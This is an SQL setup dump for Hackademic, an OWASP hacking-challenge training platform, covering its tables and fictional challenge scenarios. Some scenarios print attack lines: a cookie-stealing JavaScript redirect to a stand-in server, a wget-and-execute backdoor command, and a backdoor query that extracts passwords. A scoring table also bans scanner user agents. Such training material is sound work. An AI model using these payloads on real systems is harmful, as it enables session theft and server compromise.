SHOW WARNINGS;
--
-- Table structure for table `articles`
--
CREATE TABLE IF NOT EXISTS  articles  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   title  varchar(255) DEFAULT NULL,
   content  longtext,
   date_posted  datetime NOT NULL,
   created_by  varchar(255) NOT NULL,
   last_modified  datetime DEFAULT NULL,
   last_modified_by  varchar(255) DEFAULT NULL,
   ordering  int(10) DEFAULT '0',
   is_published  int(1) DEFAULT '1',
  PRIMARY KEY ( id )
);

--
-- Dumping data for table  articles
--
INSERT INTO articles ( title , content , date_posted , created_by , last_modified , last_modified_by , ordering , is_published ) VALUES
('Welcome to Hackademic v0.9!', '<p><img width=\"840\" height=\"188\" logo\"=\" alt=\"owasp\" src=\"http://www.techtoweb.com/wp-content/uploads/2012/12/owasp-security.png\"></p> <p>Thank you for installling and using the Hackademic challenges project.</p> <p>You can find our code on github <a href=\"https://github.com/Hackademic/hackademic\">here</a>, for any problems or support, please open an issue on our github repository.</p><p>Hackademic is a FOSS project under the OWASP umbrela organization.</p>', '2013-08-18 00:00:17', 'admin', '2013-08-18 00:04:27', 'admin', 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table  challenges
--

CREATE TABLE IF NOT EXISTS  challenges  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   title  varchar(255) DEFAULT NULL,
   pkg_name  varchar(255) NOT NULL,
   description  text,
   congratulation_page text,
   author  varchar(255) NOT NULL,
   category  varchar(255) NOT NULL,
   date_posted  datetime NOT NULL,
   visibility  varchar(255) DEFAULT 'private',
   publish  int(10) DEFAULT '0',
   abstract  varchar(255) DEFAULT NULL,
   level  varchar(255) DEFAULT NULL,
   duration  int(11) DEFAULT NULL,
   goal  varchar(255) DEFAULT NULL,
   solution  varchar(255) DEFAULT NULL,
   availability  varchar(255) DEFAULT 'private',
   default_points  int(11) DEFAULT NULL,
   default_duration  int(11) DEFAULT NULL,
  PRIMARY KEY ( id )
);

--
-- Dumping data for table  challenges
--

INSERT INTO `challenges` (`title`, `pkg_name`, `description`, `congratulation_page`, `author`, `category`, `date_posted`, `visibility`, `publish`, `abstract`, `level`, `duration`, `goal`, `solution`, `availability`, `default_points`, `default_duration`) VALUES
('Challenge 1', 'ch001', 'Our agents (hackers) informed us that there reasonable suspicion \r\nthat the site of this <a href="ch001/" target="_blank">Logistics Company</a> is a blind \r\nfor a human organs''  smuggling organisation.<br /> <br /> This organisation attracts its \r\nvictims through advertisments for jobs with very high salaries. They choose those ones who \r\ndo not have many relatives, they assasinate them and then sell their organs to very rich \r\nclients, at very high prices.<br /> <br /> These employees are registered in the secret \r\nfiles of the company as "special clients"!<br /> <br /> One of our agents has been hired \r\nas by the particular company. Unfortunately, since 01/01/2007 he has gone missing.<br /> \r\n<br /> We know that our agent is alive, but we cannot contact him. Last time he  \r\ncommunicated with us, he mentioned that we could contact him at the  e-mail address the \r\ncompany has supplied him with, should there a problem  arise.<br /> <br /> The problem is \r\nthat when we last talked to him, he had not a company  e-mail address yet, but he told us \r\nthat his e-mail can be found through  the company''s site. <br /> <br /> The only thing we \r\nremember is that he was hired on Friday the 13th! <br /> <br /> You have to find his e-mail \r\naddress and send it to us by using the central communication panel of the company''s \r\nsite.<br /> <br /> Good luck!!!', '', 'Andreas Venieris,\n        Konstantinos Papapanagiotou,\n \n       Anastasios Stasinopoulos,\n        Vasilios Vlachos,\n        Alexandros \nPapanikolaou', 'web', '2012-08-09 00:23:14', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 2', 'ch002', 'Your Country needs your help for finding the password of an enemy \r\n\r\nsite  that contains useful information, which if is not acquired on time,  peace in our \r\n\r\narea will be at stake.<br /> <br />\n        You must therefore succeed in finding the \r\n\r\npassword of this military <a href="ch002/index.php" target="_blank">SITE</a>.<br /> <br \r\n\r\n/> Good luck!', '', 'Andreas Venieris,\n        Konstantinos Papapanagiotou,\n        Anastasios \r\n\r\nStasinopoulos,\n        Vasilios Vlachos,\n        Alexandros Papanikolaou', 'web', '0000-00-00 00:00:00', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 3', 'ch003', 'XSS permits a malevolent user to inject his own code in vulnerable \r\n\r\nweb  pages. According to the OWASP 2010 Top 10 Application Security Risks,  XSS attacks \r\n\r\nrank 2nd in the "most dangerous" list.<br /> <br /> Your objective is to make an alert \r\n\r\nbox appear  <a href="ch003/index.php" target="_blank">HERE</a> bearing the message: \r\n\r\n"<strong>XSS!</strong>".', '', 'Andreas Venieris,\n        Konstantinos Papapanagiotou,\n      \r\n\r\n  Anastasios Stasinopoulos,\n        Vasilios Vlachos,\n        Alexandros \r\n\r\nPapanikolaou', 'web', '2012-08-09 00:24:46', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 4', 'ch004', 'A hacker informed us that <a href="ch004/index.php" target=\r\n\r\n"_blank">this</a> site suffers from an XSS-like type of  vulnerability. Unfortunately, he \r\n\r\nlost the notes he had written regarding  how exactly did he exploit the aforementioned \r\n\r\nvulnerability.<br /> Your objective is to make an alert box appear, bearing the message \r\n\r\n"<strong>XSS!</strong>". It should be noted, however, that this site has some protection \r\n\r\nagainst such attacks.', '', 'Andreas Venieris,\n        Konstantinos Papapanagiotou,\n        \r\n\r\nAnastasios Stasinopoulos,\n        Vasilios Vlachos,\n        Alexandros \r\n\r\nPapanikolaou', 'web', '2012-08-09 00:25:25', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 5', 'ch005', 'You need to get access to the contents of this <a href=\r\n\r\n"ch005/index.php" target="_blank">SITE</a>. In order to achieve  this, however, you \r\n\r\nmust buy the "p0wnBrowser" web browser. Since it is  too expensive, you will have to \r\n\r\n"fool" the system in some way, so that  it let you read the site''s contents.', '', 'Andreas \r\n\r\nVenieris,\n        Konstantinos Papapanagiotou,\n        Anastasios Stasinopoulos,\n        \r\n\r\nVasilios Vlachos,\n        Alexandros Papanikolaou', 'web', '2012-08-09 00:26:09', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 6', 'ch006', 'In this assignment you must prove your... knightly skills! Real \r\n\r\nknights  have not disappeared.They still exist, keeping their secrets well  hidden.<br /> \r\n\r\nYour mission is to infiltrate their <a href="ch006/index.php" target="_blank">SITE</a>. \r\n\r\nThere is a small problem, however... We don''t know the password!<br /> Perhaps you could \r\n\r\nfind it?<br /> Let''s see!<br /> g00d luck dudes!', '', 'Andreas Venieris,\n        Konstantinos \r\n\r\nPapapanagiotou,\n        Anastasios Stasinopoulos,\n        Vasilios Vlachos,\n        \r\n\r\nAlexandros Papanikolaou', 'web', '2012-08-09 00:26:52', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 7', 'ch007', 'A good friend of mine studies at Acme University, in the <a href=\r\n\r\n"ch007/index.php" target="_blank">Computer  Science and Telecomms Department</a>. \r\n\r\nUnfortunately, her grades are not that  good. You are now thinking "This is big news!"... \r\n\r\nHmmm, maybe not. What  is big news, however, is this: The network administrator asked for  \r\n\r\n3,000 euros to change her marks into A''s. This is obviously a case of  administrative \r\n\r\nauthority abuse. Hence... a good chance for D-phase and  public exposure...<br /> I need to \r\n\r\nget into the site as admin and upload an index.htm  file in the web-root directory, that \r\n\r\nwill present all required evidence  for the University''s latest "re-marking" practices!\r\n\r\n<br /> I only need you to find the admin password for me...<br /> <br /> Good \r\n\r\nLuck!', '', 'Andreas Venieris,\n        Konstantinos Papapanagiotou,\n        Anastasios \r\n\r\nStasinopoulos,\n        Vasilios Vlachos,\n        Alexandros Papanikolaou', 'web', '0000-00-00 00:00:00', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 8', 'ch008', 'You have managed, after several tries, to install a backdoor shell \r\n\r\n(Locus7Shell) to <a href="ch008/" target="_blank">trytohack.gr<br /></a> <br /> The \r\n\r\nproblem is that, in order to execute the majority of the commands  (on the machine running \r\n\r\nthe backdoor) you must have super-user rights  (root).<br /> <br /> Your aim is to obtain \r\n\r\nroot rights.', '', 'Andreas Venieris,\n        Konstantinos Papapanagiotou,\n        Anastasios \r\n\r\nStasinopoulos,\n        Vasilios Vlachos,\n        Alexandros Papanikolaou', 'web', '0000-00-00 00:00:00', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 9', 'ch009', 'A friend of yours has set up a news blog at <a href=\r\n\r\n"ch009/index.php" target="_blank">slagoff.com</a>.  However, he is kind of worried \r\n\r\nregarding the security of the news that  gets posted on the blog and has asked you to check \r\n\r\nhow secure it is.<br /> <br /> Your objective is to determine whether any vulnerabilities \r\n\r\nexist that, if exploited, can grant access to the blog''s server.<br /> <br /> Hint: A \r\n\r\nspecially-tailored backdoor shell can be found at "<a href=\r\n\r\n"http://www.really_nasty_hacker.com/shell.txt" target="_blank\r\n\r\n">http://www.really_nasty_hacker.com/shell.txt</a>".', '', 'Andreas Venieris,\n        \r\n\r\nKonstantinos Papapanagiotou,\n        Anastasios Stasinopoulos,\n        Vasilios Vlachos,\r\n\r\n\n        Alexandros Papanikolaou', 'web', '2012-08-09 00:31:31', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Challenge 10', 'ch010', 'Would you like to become an active hacker ?<br /> How about \r\n\r\nbecoming a member of the world''s largest hacker group:<br /> The n1nJ4.n4x0rZ.CreW!<br /> \r\n\r\n<br /> Before you can join though, you ''ll have to prove yourself worthy by passing the \r\n\r\ntest that can be found at: <a href="ch010/" target="_blank\r\n\r\n">http://n1nj4h4x0rzcr3w.com</a><br /> <br /> If you succeed in completing the challenge, \r\n\r\nyou will get a serial  number, which you will use for obtaining the password that will \r\n\r\nenable  you to join the group.<br /> <br /> Your objective is to bypass the authentication \r\n\r\nmechanism, find the  serial number and be supplied with your own username and password from \r\n\r\n the admin team of the site.', '', 'Andreas Venieris,\n        Konstantinos Papapanagiotou,\n    \r\n\r\n    Anastasios Stasinopoulos,\n        Vasilios Vlachos,\n        Alexandros \r\n\r\nPapanikolaou', 'web', '2012-08-09 00:32:07', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Example Template For Challenge xml Files creation', 'example', '<p>Insert some text describing the scenario of the challenge(what the users are supposed to do and if there is any fictional story)</p>', '<p>Insert some text giving more information on the challenge, on how to prevent the flaw and on where to find more information.</p>', 'Name or email or both', 'In what category does your challenge belong?(web? crypto? networks?)', '2012-10-16 22:35:01', 'private', 0, NULL, '1', 60, NULL, NULL, 'private', 1, 0),
('cookiEng', 'cookiEng', '<p>Hello, we have heard that you are one of the best hackers in our country. We need your services.<br>You must visit an underground site and find<br> the right password. With this password we will cancel 100k+ illegal gun and drug deals!\n The good news are that we have the  directory where the password is stored. Its here \\\"/t0psec.php\\\".\n The bad news are that we have no access there. Only the administrator does. Go and find the password for us!<br><br><br>Good luck!</p>', '', 'Nikos Danopoulos', 'web', '2012-08-09 00:32:07', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 1, 60),
('Izon Challenge', 'izon', '<p>After the mysterious disappearance of your best friend, you are contacted by an unknown individual who claims to have information about your friend. This individual identifies himself as \"Mister Jax\" and claims that is a former colleague of your friend.</p><p>Your friend was working at Izon Corporation, a weapons manufactured and government contractor as a systems engineer. Mister Jax didn\'t tell you his role in Izon, but wants you to pass through a series of tests to infiltrate Izon\'s web security to find the truth about your friend</p><p>After much consideration you agree with Mister Jax and he, remotely, sets up your computer to look like as if it is a part of Izon\'s Virtual Private Network in order to access their site. He also said that he\'ll guide you while you work your way to uncover the truth about your lost friend</p><p>Here is a copy of Mister Jax\'s last email:</p><p><pre>The task is simple: You get in, get your information and get out.\r\nYour friend was either a dumb programmer or a brilliant one, he left\r\nmany holes to be exploited in order to gain higher access to the site.\r\nI\'ll be guiding you with tips while you try to hack through Izon\'s site.\r\nThere are four tasks, some related to each other, some not.\r\nYou need to use your skills to overcome the obstacles, knowledge will come along.\r\nSixty minutes will suffice. When they\'re over, I won\'t be able to offer any\r\ncover to you, and you\'ll be compromised, with unknown consequences, I\'m afraid.\r\nI\'ll be seeing you there.\r\n\r\   - Jax</pre></p>	<p>Once you get in, you\'ll have sixty minutes to complete this challenge. Use common sense, remember that the most obvious place hides the most important stuff and try to behave as if you were hacking a real system.</p><p>Good Luck!</p>', '', 'Vasileios Mplanas', 'web', '2014-03-27 00:00:00', 'public', 1, NULL, '1', 60, NULL, NULL, 'public', 10, 60),
('Challenge XML API', 'challenge-xml-api', '<p>In a few days you\'re gonna be ready to release your API that processes ISSPC XML documents in a new revolutionary way. You\'ve been working on this since you were hired in this firm and it\'s now working great!<br/><br/>\r\n\r\nThe only drawback is that some concurrent firm just released, today, the exact same API. Of course, you could just DDoS it with the few servers at hand but you would need to find some way to slow down their XML processing...</p>', '', 'Paul Chaignon', 'web', '2014-08-11 10:25:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Wiki', 'challenge-wiki', '<p>Presidential election campaigns are in full swing. You have been hired to create Twitter accounts and increase the number of followers of your candidate. But with your skills, you\'re sure you can do more!<br/><br/>\r\n\r\nSo you went on the famous political wiki Politipedia and \'improved\' the page of your opponent. But only a few seconds later, your modifications were undone by the user \'Admin\' and your account banned. You need to hack into this guy account. It is common hearsay the administrators keep a file with all already-attributed passwords...</p>', '', 'Paul Chaignon', 'web', '2014-07-26 12:43:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Shoes 1', 'challenge-shoes1', '<p>A friend of yours disappeared quite recently. You\'re sure it was the shoes! They swallowed him!<br/>\r\n You just want to take a look at the database of the vendor website, there might be other cases of disappearance.\r\nIn order to do that you need to find the configuration file with the database password.</p>', '', 'Paul Chaignon', 'web', '2014-07-09 16:33:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Shoes 2', 'challenge-shoes2', '<p>You manage to make a dump of the database (see Challenge shoes 1) but it was corrupted.\r\n You need to start all over again! Except they had time to change the database password\r\n and fix the vulnerability.<br/><br/>\r\nWell, at least they think they did...</p>', '', 'Paul Chaignon', 'web', '2014-07-10 12:54:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge MITM 1', 'challenge-mitm1', '<p>Happy Birds On Mars 2 comes out next week but it is already on the P2P network since yesterday. However it has not been cracked yet and the application asks you for a license key when you launch it. Hopefully you will be able to bypass that with your usual proxy for MITM attacks.<br/><br/>\r\n\r\nIt intercepts and lets your edit every requests from your smartphone to the application\'s server and their responses. (The goal here is not to hack the proxy...)</p>', '', 'Paul Chaignon', 'web', '2014-08-07 10:54:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge MITM 2', 'challenge-mitm2', '<p>After Happy Birds on Mars 2 next week (see Challenge MITM 1), today Salad Ninja 3 is available on the P2P network. You had time to add a few tools to your proxy for MITM. That\'s good because they say that their license protection is unbreakable...</p>', '', 'Paul Chaignon', 'web', '2014-07-09 18:15:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Sell your pet!', 'challenge-sell-your-pet', '<p>During your last vacation in Madagascar you bought a boa. Of course you hide it and nobody in the neighbourhood knows about it. The only problem is that you can\'t always watch it during the day and it always manages to get out of the house...<br/><br/>\r\n\r\nYesterday, it ate the last one of the 8 dogs of the neighbourhood and everyone is starting to ask questions. There is even a police investigation ongoing. You really need to get rid of it.<br/><br/>\r\n\r\nYou\'ve found this website to sell every kind of pets but your free ad is far behind. If you could steal the session of a premium user, you would be able to place your ad in the first page.<br/><br/>\r\n\r\nHere is the JavaScript code to execute to send the cookies to one of your servers: document.location=\'http://yourserver.com/?c=\'+document.cookie;</p>', '', 'Paul Chaignon', 'web', '2014-08-10 11:39:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Router', 'challenge-router', '<p>First day in your new school (strangly, you\'re not welcome anymore in your old school)! After an interesting scan of the local network you\'ve discovered a student\'s router. Time to show those loosers how smart you are! Let\'s hack into the router!</p>', '', 'Paul Chaignon', 'web', '2014-07-21 17:54:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Printer', 'challenge-printer', '<p>Write the conclusion, update dates, make the final corrections, add my name... Okay that\'s it! Whew, still got 15 minutes to print it and staple before noon. Easy. Ctrl+P, check the options for the printer, submit. Eh! What do you mean \'You reached your weekly limit\'? Damn printer! If I don\'t get this on the boss\' desk by noon I\'ll never have my pay raise!<br/><br/>\r\n\r\nOkay, breathe. No time to ask the IT department for an increase of your quota... Everyone in the office is out for lunch... Only one way to pull through: I need to hack into the admin account on the printer web interface!</p>', '', 'Paul Chaignon', 'web', '2014-07-26 21:27:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge NAFO', 'challenge-nafo', '<p>You\'ve just come out of your boss\' office. He fired you. But this is not the time to whine. You have about ten minutes before your account is entirely removed from the information system. You were working on a project for DARPA with information that could interest many people...<br/><br/>\r\n\r\nYou can\'t log anymore into the project website but your account doesn\'t seem deleted since you can still reset your password. The usernames are composed of the first letter of the given name followed by the surname. For example your username is jsmith (for John Smith).<br/><br/>\r\n\r\nYou will have to log in using the account of someone else. Your boss, Omid Kamangar, would make the perfect target :-)</p>', '', 'Paul Chaignon', 'web', '2014-07-09 10:52:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Pictures', 'challenge-pictures', '<p>Picture Corporation owns a website simply named Picture with a business model similar to Youtube. When you upload something on the website you give away your intellectual property on the picture. Then, the corporation makes money with the ads on the website and the rights on the pictures. Your pictures. Eventually, some users get paid by Picture Corporation if their pictures have much success.<br/><br/>\r\n\r\nIf you could install a backdoor on the website you would be able to record the logins of all the users. You might find some paid users and steal their money...<br/><br/>\r\n\r\nYou already have a script ready for this. You just need to find a way to execute the following PHP line on Picture\'s server:<br/>\r\nwget "http://malicioussource.com/d43.php";./d43.php</p>', '', 'Paul Chaignon', 'web', '2014-08-12 12:48:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge CAS', 'challenge-cas', '<p>Only 4 days left before the first day of school. Many new students are wandering on school\'s forums and associations\' groups on social networks. Some of them are freaked out and asking for last-minute information.<br/><br/>\r\n\r\nYou\'ve found one asking for the URL to the courses website. A good oportunity to redirect him to your last compromissed website: http://legitimatewebsite.info/compromissed.html. If you manage this you\'ll have total control over his computer! You need to give him a legitimate-looking URL to the Central Authentication Service.</p>', '', 'Paul Chaignon', 'web', '2014-07-16 17:55:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Cafébook', 'challenge-cafebook', '<p>Last week you posted an umpteenth comment on a Youtube video to mock its six year old protagonist. Today, she responded in another video making a fool out of you. Undeterred, you close your Youtube account and decide to hack her Cafébook [1] account. Full of your advanced hacker knowledge, you need to find her password.<br/><br/>\r\n\r\n You already know that she\'s named Abby, has a puppy named Black, lives in New York (ZIP code: 110) and she was born Fourth of November. Her email address is abby.sciuto@cafebook.com.<br/><br/>\r\n\r\n [1] - Famous social network that everyone uses to promote cat videos on Youtube.</p>', '', 'Paul Chaignon', 'web', '2014-07-21 10:27:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge BigBlue', 'challenge-bigblue', '<p>BigBlue: more than 100 billions requests per day, 82% of the market share, more than 50 millions lines of code and more than 50000 employees. You used to be one of them. At the very beginning, before the IPO. You developed an admin section for the search engine.<br/><br/>\r\n\r\nAs always, you installed a backdoor. If you start an SQL query by J0S= in the search engine it will be performed against the database of the admin section. This allows you to retrieve regularly the passwords with the search request J0S=select username,password from users.<br/><br/>\r\n\r\nBut today it doesn\'t work. It looks like they installed a WAF which is blocking your query...</p>', '', 'Paul Chaignon', 'web', '2014-07-09 16:27:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge CopyBox', 'challenge-copybox', '<p>Your last job was in Taiwan. You had to hack into the network of a highly secure firm. The problem was that their network was completely disconnected from the Internet. They had kind of their own private Internet. A few attempts had been made to compromised the network using the employees\' smartphones, but they eventually had to resolve to call in your services.<br/><br/>\r\n\r\nThat\'s your job. You go on site to hack anything that can\'t be remotely accessed. It\'s more dangerous than the usual hacker job but it pays a lot more.<br/><br/>\r\n\r\nAnd this time all went well... Except that someone made a video of you (you conducted the attack from a free Wifi zone) and he\'s now blackmailing you. You know (from one of the screenshots he sent you) he keeps the video on his CopyBox account in a folder named Blackmails. You need to send him an email that will make him delete the folder.</p>', '', 'Paul Chaignon', 'web', '2014-08-11 14:00:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Alien 1', 'challenge-alien1', '<p>Day 12 - Every day I learn more about this stupid creatures. Today I saw a movie about what\'s supposed to be us. We are vindictive, small and for some reason we have a huge head and ridiculously long arms.<br/><br/>\r\n\r\nI also went to Europe to take a water sample in the Mediterranean Sea. One of these ignorant creatures managed to take a picture of me out of my disguise. I tracked him down and cleaned up his memory but he seems to be an active member of an online forum about aliens (that\'s how they call us). I need to check that he didn\'t post the picture, but the access is restricted...</p>', '', 'Paul Chaignon', 'web', '2014-07-31 12:24:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30),
('Challenge Alien 2', 'challenge-alien2', '<p>Day 24 - One of my shortest missions, I should take off in a few days. For once, the decision was easy.<br/><br/>\r\n\r\nFor the last weeks I have been using this forum I discovered during my 12th day here (see Challenge Alien 1) to monitor any suspicious human activity. But today it seems they corrected the vulnerability that allowed me to log in. It\'s not like they have any way to prevent their upcoming extermination... Anyway, let\'s take a look!</p>', '', 'Paul Chaignon', 'web', '2014-07-31 16:53:00', 'public', 1, NULL, '1', 30, NULL, NULL, 'public', 1, 30);
-- --------------------------------------------------------

--
-- Table structure for table  challenge_attempts
--

CREATE TABLE IF NOT EXISTS  challenge_attempts  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   user_id  int(11) NOT NULL,
   challenge_id  int(11) NOT NULL,
   class_id  int(11) NOT NULL,
   time  datetime NOT NULL,
   status  int(11) NOT NULL,
  PRIMARY KEY ( id ),
  KEY  user_id  ( user_id , challenge_id , class_id )
);

-- --------------------------------------------------------

--
-- Table structure for table  challenge_attempt_count
--

CREATE TABLE IF NOT EXISTS  challenge_attempt_count  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   user_id  int(11) NOT NULL,
   challenge_id  int(11) NOT NULL,
   class_id  int(11) NOT NULL,
   tries  int(11) DEFAULT NULL,
  PRIMARY KEY ( id ),
  UNIQUE KEY  composite_key  ( user_id , challenge_id , class_id )
);
-- --------------------------------------------------------

--
-- Table structure for table  classes
--

CREATE TABLE IF NOT EXISTS  classes  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   name  varchar(255) NOT NULL,
   date_created  datetime NOT NULL,
   archive  int(1) DEFAULT '0',
  PRIMARY KEY ( id )
);

--
-- Dumping data for table  classes
--
INSERT INTO classes ( id , name , date_created , archive ) VALUES
(1, 'Global Class', '2012-08-09 00:43:48', 0);

-- --------------------------------------------------------

--
-- Table structure for table  class_challenges
--

CREATE TABLE IF NOT EXISTS  class_challenges  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   challenge_id  int(11) NOT NULL,
   class_id  int(11) NOT NULL,
   date_created  datetime NOT NULL,
  PRIMARY KEY ( id )
);

--
-- Dumping data for table  class_challenges
--


INSERT INTO  class_challenges  (challenge_id ,  class_id ,  date_created ) VALUES
(1, 1, '2012-08-09 01:01:07'),
(2, 1, '2012-08-09 01:01:07'),
(3, 1, '2012-08-09 01:01:07'),
(4, 1, '2012-08-09 01:01:07'),
(5, 1, '2012-08-09 01:01:07'),
(6, 1, '2012-08-09 01:01:07'),
(7, 1, '2012-08-09 01:01:07'),
(8, 1, '2012-08-09 01:01:07'),
(9, 1, '2012-10-16 22:32:58'),
(10, 1, '2012-08-09 01:01:07');

-- --------------------------------------------------------

--
-- Table structure for table  class_memberships
--

CREATE TABLE IF NOT EXISTS  class_memberships  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   user_id  int(11) NOT NULL,
   class_id  int(11) NOT NULL,
   date_created  datetime NOT NULL,
  PRIMARY KEY ( user_id , class_id ),
  UNIQUE KEY  id  ( id )
);

-- --------------------------------------------------------


--
-- Table structure for table  scoring_rule
--

CREATE TABLE IF NOT EXISTS  scoring_rule  (
   id  int(11) NOT NULL AUTO_INCREMENT,
   challenge_id  int(11) NOT NULL,
   class_id  int(11) NOT NULL,
   attempt_cap  int(11) NOT NULL DEFAULT '0',
   attempt_cap_penalty  int(11) NOT NULL DEFAULT '0',
   time_between_first_and_last_attempt  int(11) NOT NULL DEFAULT '0',
   time_penalty  int(11) NOT NULL DEFAULT '0',
   time_reset_limit_seconds  int(11) NOT NULL DEFAULT '0',
   request_frequency_per_minute  int(11) NOT NULL DEFAULT '0',
   request_frequency_penalty  int(11) NOT NULL DEFAULT '0',
   experimentation_bonus  int(11) NOT NULL DEFAULT '0',
   multiple_solution_bonus  int(11) NOT NULL DEFAULT '0',
   banned_user_agents  longtext CHARACTER SET ascii COLLATE ascii_bin,
   banned_user_agents_penalty  int(11) NOT NULL DEFAULT '0',
   base_score  int(11) NOT NULL DEFAULT '5',
   first_try_solves  int(11) NOT NULL DEFAULT '0',
   penalty_for_many_first_try_solves  int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY ( id ),
  KEY  challenge_id  ( challenge_id , class_id )
);

--
-- Dumping data for table  scoring_rule
--

INSERT INTO  scoring_rule  (challenge_id ,  class_id ,  attempt_cap ,  attempt_cap_penalty ,  time_between_first_and_last_attempt ,  time_penalty ,  time_reset_limit_seconds ,  request_frequency_per_minute ,  request_frequency_penalty ,  experimentation_bonus ,  multiple_solution_bonus ,  banned_user_agents ,  banned_user_agents_penalty ,  base_score ,  first_try_solves ,  penalty_for_many_first_try_solves ) VALUES
(-1, -1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 'Indy Library,\r\nlibwww-perl, \r\ncurl, \r\nnikto, \r\nw3af, ', 0, 1, 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table options
--

CREATE TABLE IF NOT EXISTS options (
  option_name varchar(64) NOT NULL,
  option_value text NOT NULL,
  PRIMARY KEY (option_name)
);

--
-- Dumping data for table options
--

INSERT INTO options VALUES 
('active_plugins','[]'),
('active_user_theme','""'),
('active_admin_theme','""');

-- --------------------------------------------------------

--
-- Table structure for table menus
--

CREATE TABLE IF NOT EXISTS menus (
  mid int(11) NOT NULL auto_increment,
  name varchar(50) NOT NULL default '',
  PRIMARY KEY  (`mid`)
);

--
-- Dumping data for table menus
--

INSERT INTO menus (mid, name) VALUES 
(1, 'Admin menu'),
(2, 'Teacher menu'),
(3, 'Student menu');

-- --------------------------------------------------------

--
-- Table structure for table `pages`
--

CREATE TABLE IF NOT EXISTS `pages` (
  `url` varchar(250) NOT NULL default '',
  `file` varchar(250) NOT NULL default '',
  PRIMARY KEY  (`url`)
);

--
-- Dumping data for table `pages`
--

INSERT INTO `pages` (`url`, `file`) VALUES 
('admin', 'admin/index.php'),
('admin/scoringrules', 'admin/pages/scoringrules.php'),
('admin/addarticle', 'admin/pages/addarticle.php'),
('admin/articlemanager', 'admin/pages/articlemanager.php'),
('admin/dashboard', 'admin/pages/dashboard.php'),
('admin/usermanager', 'admin/pages/usermanager.php'),
('admin/addchallenge', 'admin/pages/addchallenge.php'),
('admin/challengemanager', 'admin/pages/challengemanager.php'),
('admin/options', 'admin/pages/options.php'),
('progressreport', 'pages/progress.php'),
('ranking', 'pages/ranking.php'),
('challenges', 'pages/challengelist.php'),
('login', 'pages/login.php'),
('logout', 'pages/logout.php'),
('challenge_monitor', 'pages/challenge_monitor.php'),
('challengelist', 'pages/challengelist.php'),
('challengesfrontend', 'pages/challengesfrontend.php'),
('forgotpassword', 'pages/forgotpassword.php'),
('home', 'pages/home.php'),
('mainlogin', 'pages/mainlogin.php'),
('readarticle', 'pages/readarticle.php'),
('register', 'pages/register.php'),
('resetpassword', 'pages/resetpassword.php'),
('showchallenges', 'pages/showchallenges.php'),
('congratulation', 'pages/congratulation.php'),
('trychallenge', 'pages/trychallenge.php'),
('admin/addclass', 'admin/pages/addclass.php'),
('admin/adduser', 'admin/pages/adduser.php'),
('admin/classchallenges', 'admin/pages/classchallenges.php'),
('admin/classmemberships', 'admin/pages/classmemberships.php'),
('admin/download', 'admin/pages/download.php'),
('admin/editarticle', 'admin/pages/editarticle.php'),
('admin/editchallenge', 'admin/pages/editchallenge.php'),
('admin/editcode', 'admin/pages/editcode.php'),
('admin/edituser', 'admin/pages/edituser.php'),
('admin/login', 'admin/pages/login.php'),
('admin/logout', 'admin/pages/logout.php'),
('admin/manageclass', 'admin/pages/manageclass.php'),
('admin/menumanager', 'admin/pages/menumanager.php'),
('admin/showclass', 'admin/pages/showclass.php');

-- --------------------------------------------------------

--
-- Table structure for table `menu_items`
--

CREATE TABLE IF NOT EXISTS `menu_items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `url` varchar(250) NOT NULL default '',
  `mid` int(11) NOT NULL,
  `label` varchar(50) NOT NULL default '',
  `parent` int(11) NOT NULL default 0,
  `sort` int(11) default 0,
  PRIMARY KEY  (`id`),
  FOREIGN KEY (`mid`) REFERENCES menus(`mid`)
);

--
-- Dumping data for table `menu_items`
--

INSERT INTO `menu_items` (`url`, `mid`, `label`, `parent`, `sort`) VALUES 
('admin', 1,  'Home', 0, 0),
('admin/addarticle', 1, 'Add New Articles', 0, 1),
('admin/articlemanager', 1, 'Article Manager', 0, 2),
('admin/usermanager', 1, 'Users/Classes', 0, 3),
